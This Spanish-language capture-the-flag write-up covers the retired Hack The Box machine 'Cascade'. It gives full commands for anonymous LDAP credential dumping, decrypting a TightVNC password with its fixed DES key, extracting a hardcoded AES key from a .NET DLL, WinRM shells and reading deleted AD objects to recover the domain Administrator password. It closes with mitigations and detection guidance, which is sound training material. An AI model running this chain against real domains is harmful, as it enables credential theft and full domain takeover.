---
machine: Cascade
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, ldap, smb, vnc, dotnet, ad-recycle-bin, winrm]
---

# Cascade — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

El controlador de dominio `cascade.local` acepta **bind LDAP anónimo** y devuelve un atributo propio de la empresa, `cascadeLegacyPwd`, con la contraseña de `r.thompson` en base64. Ese usuario lee el share `Data`, donde un respaldo de la configuración de TightVNC guarda la contraseña de `s.smith` cifrada con la clave DES fija del producto. Con `s.smith` se llega a WinRM y al share oculto `Audit$`, que contiene `CascAudit.exe`, `CascCrypto.dll` y `Audit.db`: la clave AES está en la DLL y descifra la contraseña de `arksvc`. `arksvc` pertenece a **AD Recycle Bin** y puede leer los objetos borrados, entre ellos `TempAdmin`, cuyo `cascadeLegacyPwd` es la misma contraseña del **Administrator** del dominio.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -oA nmap_all <IP>
nmap -p 53,88,135,139,389,445,636,3268,3269,5985 -sCV -oA nmap_svc <IP>
```

```text
53/tcp    open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: cascade.local)
445/tcp   open  microsoft-ds
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

- Host `CASC-DC1`, dominio `cascade.local` y un **Windows Server 2008 R2 SP1**, fuera de soporte desde 2020.
- El 5985 abierto es la salida: cualquier cuenta con permiso de WinRM da shell directa.
- Sin 80 ni 443: la superficie es toda de directorio y SMB.

```bash
echo "<IP> cascade.local CASC-DC1.cascade.local" | sudo tee -a /etc/hosts
```

## Enumeración

El bind LDAP anónimo está permitido, así que se puede volcar el directorio sin credenciales:

```bash
ldapsearch -x -H ldap://<IP> -b 'DC=cascade,DC=local' -s sub '(objectClass=user)' \
  sAMAccountName description cascadeLegacyPwd
```

El atributo `cascadeLegacyPwd` no es estándar: lo añadió la empresa para "compatibilidad" con una aplicación antigua. Su valor es base64:

```bash
echo '<BASE64>' | base64 -d; echo
```

Eso da la contraseña de **`r.thompson`**. SMB sin credenciales no muestra nada útil, pero con esa cuenta sí:

```bash
smbclient -L //<IP> -N
smbclient //<IP>/Data -U 'r.thompson%<PASSWORD>'
```

Dentro de `Data` interesa `IT\Temp\s.smith\VNC Install.reg`, un respaldo del registro con la configuración del cliente TightVNC del administrador.

## Foothold

TightVNC guarda la contraseña en `Password` como hexadecimal y la cifra con **DES y una clave fija** que está en el propio producto (`e84ad660c4721ae0`). No es un hash: es reversible sin fuerza bruta.

```bash
echo 6bcf2a4b6e5aca0f | xxd -r -p > vnc.bin
openssl enc -d -des-ecb -K e84ad660c4721ae0 -nopad -in vnc.bin
vncpwd 6bcf2a4b6e5aca0f        # alternativa lista para usar
```

La salida es la contraseña de **`s.smith`**, que además de leer `Audit$` tiene acceso a WinRM:

```bash
nxc winrm <IP> -u s.smith -p '<PASSWORD>'
evil-winrm -i <IP> -u s.smith -p '<PASSWORD>'
```

Por qué funciona: nadie rota la contraseña de un cliente VNC y el respaldo del registro se dejó en un share de TI que media docena de cuentas puede leer.

## Movimiento lateral

`s.smith` está en el grupo **`Audit Share`**, que da acceso al share oculto `Audit$`:

```bash
smbclient //<IP>/Audit$ -U 's.smith%<PASSWORD>'
# get CascAudit.exe, get CascCrypto.dll, get Audit.db
sqlite3 Audit.db '.tables'
sqlite3 Audit.db 'select * from ldap;'
```

La tabla `ldap` guarda la contraseña de **`arksvc`** cifrada. La clave no hay que buscarla lejos: está en `CascCrypto.dll`, que expone `Crypto.DecryptString(pwd, key)` con la clave AES escrita en el código. Se abre con dnSpy/ILSpy, se localiza la constante y se descifra:

```csharp
Crypto.DecryptString("<CIPHERTEXT>", "c4scadek3y654321")
```

El resultado es la contraseña de `arksvc`, que también entra por WinRM:

```bash
evil-winrm -i <IP> -u arksvc -p '<PASSWORD>'
```

## Escalada de privilegios

`arksvc` es miembro de **`AD Recycle Bin`**, el grupo que puede leer objetos eliminados del directorio. Un objeto borrado conserva sus atributos, incluidos los personalizados:

```powershell
whoami /groups | Select-String "Recycle"
Get-ADObject -filter 'isDeleted -eq $true -includeDeletedObjects -property *' |
  Select-Object Name, sAMAccountName, cascadeLegacyPwd
```

Aparece `TempAdmin`, una cuenta temporal que se borró en vez de deshabilitarse. Su `cascadeLegacyPwd` vuelve a ser base64; al decodificarlo se obtiene la contraseña del **Administrator** del dominio, porque la cuenta temporal se creó copiando la del administrador.

```bash
echo '<BASE64>' | base64 -d; echo
evil-winrm -i <IP> -u Administrator -p '<PASSWORD>'
```

Alternativa si el atributo no estuviera: `Restore-ADObject` sobre el borrado y leer sus propiedades ya restauradas, con el mismo resultado y más ruido en el directorio.

## Evidencia

- Volcado LDAP recortado, mostrando el nombre del atributo y no su valor.
- `base64 -d` y la salida de `openssl` sin la contraseña en claro.
- `whoami /groups` con `AD Recycle Bin` y la lista de objetos borrados.
- Sin flags, sin contraseñas y sin el contenido de `Audit.db`.

## Lecciones aprendidas

- Un atributo LDAP "heredado" es una credencial en texto claro con otro nombre: se busca con `ldapsearch` y se decodifica.
- Los respaldos de configuración de clientes remotos (VNC, RDP, FTP) son credenciales: el cifrado de VNC es reversible por diseño.
- Antes de atacar el dominio conviene leer los shares de TI; `Audit$` era el paso que faltaba y no se ve en un `smbclient -L` normal.
- Reversar una DLL de .NET de 20 líneas cuesta menos que cualquier ataque al directorio.
- El grupo `AD Recycle Bin` no es de lectura: es persistencia y recuperación de secretos.

## Mitigaciones y detección

- Prohibir el bind anónimo en LDAP y auditar los atributos personalizados que contengan secretos.
- Rotar las contraseñas de VNC y no guardar respaldos del registro en shares de usuario; usar `msDS-SupportedEncryptionTypes`/LAPS para las cuentas locales.
- No dejar cuentas borradas con contraseñas válidas: deshabilitar y rotar antes de eliminar, y vaciar los atributos sensibles.
- Restringir `AD Recycle Bin` a cuentas de servicio auditadas; el grupo está pensado para administradores, no para servicios.
- Detección: consultas LDAP anónimas (evento 2889 en el DC), lectura del atributo `cascadeLegacyPwd` (4662 sobre el objeto), acceso a shares ocultos `Audit$` (5140/5145), y enumeración de objetos borrados con `Get-ADObject -includeDeletedObjects` (4688 con esa línea de comandos o Sysmon 1).

MITRE: T1087.002 (domain account discovery), T1552.001 (credentials in files), T1555 (credentials from password stores), T1078.002 (domain accounts), T1021.006 (WinRM).

## Referencias

- <https://www.hackthebox.com/machines/cascade>
- <https://thehacksparrow.com/cascade>
- <https://fahmifj.github.io/ctf/hackthebox/cascade>
- <https://blog.raw.pm/en/HackTheBox-Cascade-write-up>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin>
